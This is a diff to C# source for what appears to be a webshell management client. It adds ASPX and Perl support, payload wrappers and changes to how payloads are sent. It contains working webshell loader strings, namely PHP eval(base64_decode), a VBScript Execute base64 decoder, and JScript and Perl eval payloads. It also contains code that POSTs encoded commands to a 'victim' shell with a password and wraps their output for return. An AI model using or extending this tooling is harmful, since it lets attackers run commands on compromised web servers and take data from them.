@@ -29,7 +29,7 @@ namespace Alien
         /// <summary>
         /// 
         /// </summary>
-        private Dictionary<enLanguage, string> m_dicSuffix = new Dictionary<enLanguage, string>()
+        public static Dictionary<enLanguage, string> m_dicSuffix = new Dictionary<enLanguage, string>()
         {
             { enLanguage.PHP, "php" },
             { enLanguage.ASP, "asp" },
@@ -38,17 +38,35 @@ namespace Alien
             { enLanguage.ASHX, "ashx" },
             { enLanguage.JSP, "jsp" },
             { enLanguage.JSPX, "jspx" },
-            { enLanguage.CGI, "cgi" },
+            { enLanguage.Perl, "pl" },
             { enLanguage.Python, "py" },
+
         };
 
-        public Dictionary<enLanguage, Func<string, string, string>> m_dicPayloadWrapper = new Dictionary<enLanguage, Func<string, string, string>>()
+        private readonly Dictionary<enLanguage, Func<string, Func<string, string, string>>> m_dicWrapper = new()
         {
             {
-                enLanguage.PHP, fnWrapPHP
+                enLanguage.PHP,
+                type => type switch
+                {
+                    _ => fnWrapPHP
+                }
             },
             {
-                enLanguage.ASP, fnWrapVBScript
+                enLanguage.ASP,
+                type => type switch
+                {
+                    _ => fnWrapVBScript
+                }
+            },
+            {
+                enLanguage.ASPX,
+                type => type switch
+                {
+                    "JScript" => fnWrapJScript,
+                    "CSharp"  => fnWrapCSharp,
+                    _ => throw new NotSupportedException()
+                }
             }
         };
 
@@ -70,12 +88,24 @@ namespace Alien
                 {
                     "<%", "%>",
                 }
+            },
+            {
+                enLanguage.ASPX,
+                new string[]
+                {
+                    "<%", "%>",
+                }
+            },
+            {
+                enLanguage.Perl,
+                new string[]
+                {
+                    "", "",
+                }
             }
         };
 
-        /// <summary>
-        /// 
-        /// </summary>
+        /*
         private Dictionary<enLanguage, string> m_dicDecodeFunc = new Dictionary<enLanguage, string>()
         {
             { enLanguage.PHP, "@eval(base64_decode('[PATTERN]'));" },
@@ -83,6 +113,40 @@ namespace Alien
             { enLanguage.ASP, @"Execute(""On+Error+Resume+Next:Function+d(s):Set+x=CreateObject(""""MSXML2.DOMDocument""""):Set+e=x.createElement(""""t""""):e.dataType=""""bin.base64"""":e.text=s:Set+st=CreateObject(""""ADODB.Stream""""):st.Type=1:st.Open:st.Write+e.nodeTypedValue:st.Position=0:st.Type=2:st.CharSet=""""utf-8"""":d=st.ReadText:End+Function:Execute(d(""""[PATTERN]"""")):Response.End"")" },
             //{ enLanguage.ASP, @"Execute(""On+Error+Resume+Next:Function+fg():Dim+c:c=Response.CharSet:If+c=""""+Then:Select+Case+Session.CodePage:Case+65001:c=""""utf-8"""":Case+1252:c=""""windows-1252"""":Case+936:c=""""gb2312"""":Case+950:c=""""big5"""":Case+1251:c=""""windows-1251"""":Case+Else:c=""""utf-8"""":End+Select:End+If:fg=c:End+Function:Function+d(s):Dim+x,n,st:Set+x=CreateObject(""""MSXML2.DOMDocument""""):Set+n=x.createElement(""""b64""""):n.dataType=""""bin.base64...""'""...text=s:Set+st=CreateObject(""""ADODB.Stream""""):st.Type=1:st.Open:st.Write+n.nodeTypedValue:st.Position=0:st.Type=2:st.Charset=fg():d=st.ReadText:st.Close:Set+st=Nothing:Set+n=Nothing:Set+x=Nothing:End+Function:Execute(d(Request(""""[PATTERN]""""))):Response.End"")" },
             { enLanguage.ASPX, @"var a0=Request.Item[""PATTERN""];var err:Exception;eval(System.Text.Encoding.GetEncoding(""UTF-8"").GetString(System.Convert.FromBase64String(a0)),""unsafe"");Response.End();" }
+        };
+        */
+
+        private Dictionary<enLanguage, Func<string, string?>> m_dicDecodeFunc = new Dictionary<enLanguage, Func<string, string?>>()
+        {
+            {
+                enLanguage.PHP, (type) =>
+                {
+                    return "@eval(base64_decode('[PATTERN]'));";
+                }
+            },
+            {
+                enLanguage.ASP, (type) =>
+                {
+                    return @"Execute(""On Error Resume Next:Function d(s):Set x=CreateObject(""""MSXML2.DOMDocument""""):Set e=x.createElement(""""t""""):e.dataType=""""bin.base64"""":e.text=s:Set st=CreateObject(""""ADODB.Stream""""):st.Type=1:st.Open:st.Write e.nodeTypedValue:st.Position=0:st.Type=2:st.CharSet=""""utf-8"""":d=st.ReadText:End Function:Execute(d(""""[PATTERN]"""")):Response.End"")";
+                }
+            },
+            {
+                enLanguage.ASPX, (type) =>
+                {
+                    if (type == "JScript")
+                        return @"var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(""[PATTERN]"")),""unsafe"");}catch(err){Response.Write(""ERROR://""+err.message);}Response.End();";
+                    else if (type == "CSharp")
+                        return string.Empty;
+
+                    return null;
+                }
+            },
+            {
+                enLanguage.Perl, (type) =>
+                {
+                    return @"use CGI; use MIME::Base64; print(""Content-Type: text/html\r\n\r\n""); eval(MIME::Base64::decode_base64(""[PATTERN]""));";
+                }
+            }
         };
 
         /// <summary>
@@ -92,7 +156,8 @@ namespace Alien
         {
             { enLanguage.PHP, "echo(\"[SPLITTER]\");" },
             { enLanguage.ASP, "Response.Write(\"[SPLITTER]\")" },
-            { enLanguage.ASPX, "Response.Write(\"[SPLITTER]\");" }
+            { enLanguage.ASPX, "Response.Write(\"[SPLITTER]\");" },
+            { enLanguage.Perl, "print \"[SPLITTER]\";" }
         };
 
         private Dictionary<enLanguage, Func<string, string>> m_dicEncapusulator = new Dictionary<enLanguage, Func<string, string>>()
@@ -476,13 +541,15 @@ namespace Alien
             {
                 using (HttpResponseMessage resp = await m_clnt.GetAsync(string.Empty))
                 {
-                    resp.EnsureSuccessStatusCode();
+                    int statusCode = (int)resp.StatusCode;      // e.g. 200
+                    HttpStatusCode code = resp.StatusCode;      // e.g. HttpStatusCode.OK
 
-                    using (HttpContent content = resp.Content)
+                    if (resp.IsSuccessStatusCode)
                     {
-                        string szResult = await content.ReadAsStringAsync();
-                        return resp.IsSuccessStatusCode;
+                        string szResult = await resp.Content.ReadAsStringAsync();
                     }
+
+                    return statusCode != 404;
                 }
             }
             catch (Exception ex)
@@ -529,8 +596,13 @@ namespace Alien
                 for (int i = 0; i < asParams.Length; i++)
                     asParams[i] = $"z{i}={Uri.EscapeDataString(clsEzData.fnszStre2b64(asParams[i]))}";
 
+                string szPayloadMethod = m_victim.m_ShellConfig.szMethod;
+
                 string szParams = string.Join("&", asParams);
-                szPayload = $"{m_victim.ShellPassword}={m_dicDecodeFunc[m_victim.ShellLanguage].Replace("[PATTERN]", Uri.EscapeDataString(clsEzData.fnszStre2b64(szPayload)))}&{szParams}";
+                //string? szLoader = m_dicDecodeFunc[m_victim.ShellLanguage](szPayloadMethod)?.Replace("[PATTERN]", Uri.EscapeDataString(clsEzData.fnszStre2b64(szPayload)));
+                string? szLoader = Uri.EscapeDataString(m_dicDecodeFunc[m_victim.ShellLanguage](szPayloadMethod))?.Replace("%5BPATTERN%5D", Uri.EscapeDataString(clsEzData.fnszStre2b64(szPayload))).Replace(" ", "%20");
+
+                szPayload = $"{m_victim.ShellPassword}={szLoader}&{szParams}";
             }
 
             return await fnHttpPOST(szPayload, szSplitter);
@@ -544,8 +616,10 @@ namespace Alien
             for (int i = 0; i < asParams.Length; i++)
                 asParams[i] = $"z{i}={clsEzData.fnszStre2b64(asParams[i])}";
 
+            string szPayloadMethod = m_victim.m_ShellConfig.szMethod;
+
             string szMain = m_dicEncapusulator[m_victim.ShellLanguage](szPayload);
-            string szLoader = m_dicDecodeFunc[m_victim.ShellLanguage].Replace("[PATTERN]", szMain);
+            string? szLoader = m_dicDecodeFunc[m_victim.ShellLanguage](szPayloadMethod)?.Replace("[PATTERN]", szMain);
             string szParams = string.Join("&", asParams);
 
             szPayload = $"{m_victim.ShellPassword}={szLoader}&{szParams}";
@@ -574,15 +648,21 @@ namespace Alien
             {
                 string szPayload = File.ReadAllText(szPayloadFilePath);
                 foreach (string szPattern in m_dicRemoveSyntax[m_victim.ShellLanguage])
+                {
+                    if (string.IsNullOrEmpty(szPattern))
+                        continue;
+
                     szPayload = szPayload.Replace(szPattern, string.Empty);
+                }
 
                 const string split = "----------[THE CODE ABOVE WILL NOT BE INCLUDED]----------";
                 szPayload = szPayload.Split(new string[] { split }, StringSplitOptions.None).Last();
 
-                if (m_dicPayloadWrapper.ContainsKey(m_victim.ShellLanguage))
+                if (m_dicWrapper.ContainsKey(m_victim.ShellLanguage))
                 {
                     string szEncryptor = string.Empty;
-                    szPayload = m_dicPayloadWrapper[m_victim.ShellLanguage](szPayload, szEncryptor);
+                    string szMethod = m_victim.m_ShellConfig.szMethod;
+                    szPayload = m_dicWrapper[m_victim.ShellLanguage](szMethod)(szPayload, szEncryptor);
                 }
 
                 string szSplitFunc = m_dicSplitter[m_victim.ShellLanguage].Replace("SPLITTER", szSplitter);
@@ -639,6 +719,81 @@ namespace Alien
                 "";
 
             string szProcessed = szOriginalPayload.Replace("<?php", "").Replace("?>", "");
+
+            return $"{szHeader}{szProcessed}{szFooter}";
+        }
+
+        private static string fnWrapCSharp(string szOriginalPayload, string szEncryptor)
+        {
+            string szHeader =
+                "\r\n" +
+                (string.IsNullOrEmpty(szEncryptor) ?
+                "public static string Encrypt(string data)\r\n" +
+                "{\r\n" +
+                "    // TODO: Add C# encryption logic here\r\n" +
+                "    return data;\r\n" +
+                "}" : szEncryptor) + "\r\n\r\n" +
+                "// Setup buffer\r\n" +
+                "System.Text.StringBuilder sbOutput = new System.Text.StringBuilder();\r\n" +
+                "Action<string> Echo = (s) => sbOutput.Append(s);\r\n\r\n";
+
+            string szFooter = "\r\n\r\nResponse.Write(Encrypt(sbOutput.ToString()));\r\n";
+            string szProcessed = szOriginalPayload;
+            
+            szProcessed = Regex.Replace(szProcessed, @"\bResponse\.Write\b", "Echo", RegexOptions.IgnoreCase);
+
+            return $"{szHeader}{szProcessed}{szFooter}";
+        }
+
+        private static string fnWrapJScript(string szOriginalPayload, string szEncryptor)
+        {
+            string szHeader =
+                "\r\n" +
+                "var globalStringOutput = '';\r\n" +
+                "function Echo(s) {\r\n" +
+                "    globalStringOutput += s;\r\n" +
+                "}\r\n\r\n" +
+
+                (string.IsNullOrEmpty(szEncryptor) ?
+                "function Encrypt(s) {\r\n" +
+                "    // TODO: Add JScript encryption logic here\r\n" +
+                "    return s;\r\n" +
+                "}" : szEncryptor) + "\r\n\r\n";
+
+            string szFooter = "\r\n\r\nResponse.Write(Encrypt(globalStringOutput));\r\n";
+
+            string szProcessed = szOriginalPayload;
+
+            szProcessed = Regex.Replace(szProcessed, @"Response\.Write", "Echo", RegexOptions.IgnoreCase);
+            szProcessed = Regex.Replace(szProcessed, @"\becho\b", "Echo", RegexOptions.IgnoreCase);
+
+            return $"{szHeader}{szProcessed}{szFooter}";
+        }
+
+        private static string fnWrapPerl(string szOriginalPayload, string szEncryptor)
+        {
+            string szHeader =
+                "\r\n" +
+                (string.IsNullOrEmpty(szEncryptor) ?
+                "sub Encrypt {\r\n" +
+                "    my ($data) = @_;\r\n" +
+                "    # TODO: Add Perl encryption logic here\r\n" +
+                "    return $data;\r\n" +
+                "}" : szEncryptor) + "\r\n\r\n" +
+                "# Setup memory buffer to hijack STDOUT\r\n" +
+                "my $globalStringOutput = '';\r\n" +
+                "open(my $oldout, '>&', STDOUT);\r\n" +
+                "close(STDOUT);\r\n" +
+                "open(STDOUT, '>', \\$globalStringOutput);\r\n\r\n";
+
+            string szFooter =
+                "\r\n\r\n" +
+                "# Restore STDOUT and output encrypted data\r\n" +
+                "close(STDOUT);\r\n" +
+                "open(STDOUT, '>&', $oldout);\r\n" +
+                "print Encrypt($globalStringOutput);\r\n";
+
+            string szProcessed = szOriginalPayload;
 
             return $"{szHeader}{szProcessed}{szFooter}";
         }
